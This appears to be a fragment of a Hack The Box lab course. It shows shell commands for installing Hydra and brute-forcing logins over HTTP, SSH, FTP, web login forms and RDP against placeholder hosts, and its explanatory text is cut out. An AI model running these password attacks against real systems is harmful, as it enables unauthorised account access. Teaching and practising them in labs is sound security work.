...
```shell-session
xF1NN@htb[/htb]$ sudo apt-get -y update
xF1NN@htb[/htb]$ sudo apt-get -y install hydra 
```
...
```shell-session
xF1NN@htb[/htb]$ hydra [login_options] [password_options] [attack_options] [service_options]
```
...
```shell-session
xF1NN@htb[/htb]$ hydra -L usernames.txt -P passwords.txt www.example.com http-get
```
...
```shell-session
xF1NN@htb[/htb]$ hydra -l root -p toor -M targets.txt ssh
```
...
```shell-session
xF1NN@htb[/htb]$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```
...
```shell-session
xF1NN@htb[/htb]$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```
...
```shell-session
xF1NN@htb[/htb]$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```
